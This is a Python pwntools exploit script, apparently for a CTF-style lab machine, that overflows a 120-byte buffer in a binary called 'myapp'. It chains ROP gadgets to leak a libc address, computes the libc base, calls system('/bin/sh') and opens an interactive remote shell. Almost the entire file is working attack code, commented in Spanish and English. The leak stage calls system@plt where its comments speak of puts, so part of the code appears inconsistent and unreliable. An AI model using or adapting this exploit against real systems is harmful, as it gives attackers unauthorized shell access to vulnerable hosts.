#!/usr/bin/python3

from pwn import *

## **LOCALTEST**

#context(os='linux', arch='amd64')
#context(terminal=['tmux', 'new-window'])
# p = gdb.debug("./myapp", "b *main")
## GO UNTIL GET THAT STRING
# p.recvuntil("What do you want me to echo back?")

## **REMOTE**
p = remote("10.10.10.147", 1337)

# JUNK = 120 - len(bin_sh) (NULLBYTE = len1)
junk = b"A"*120

# ropper --file myapp --search "pop rdi" 
## --> pop rdi; ret;
pop_rdi = p64(0x40120b)

# objdump -D myapp| grep system
#  --> 0000000000401040 <system@plt>
system_plt = p64(0x401040)

main = p64(0x40115f)

# PARA LEAKEAR EL ADDRES DE puts EN LA MAQUINA REMOTA, y LLEGAR ASI A LIBC
# objdump -D myapp| grep puts
# 0000000000401030 <puts@plt>:
  #401030:	ff 25 e2 2f 00 00    	jmp    *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>
  #4011a1:	e8 8a fe ff ff       	call   401030 <puts@plt>
got_puts = p64(0x404018)

# NOTAR QUE VOLVEMOS A MAIN PARA VOLVER A EJECUTAR system(/bin/sh)
payload = junk + pop_rdi + got_puts + system_plt + main

print(p.recvline())
p.sendline(payload)

leaked_puts = u64(p.recvline().strip()[7:-11].ljust(8, b"\x00"))
log.info("Leaked puts address: 0x%x" % leaked_puts)

# VEMOS DIFERENCIA ENTRE LIBC Y PUTS EN https://libc.blukat.me
libc_address = leaked_puts - 0x068f90

log.info("Computed libc address: 0x%x" % libc_address)

bin_sh_address = p64(libc_address + 0x161c19)

payload = junk + pop_rdi + bin_sh_address + system_plt

p.recvline()
p.sendline(payload)
# TO GET INTERACTIVE TERMINAL
p.interactive()
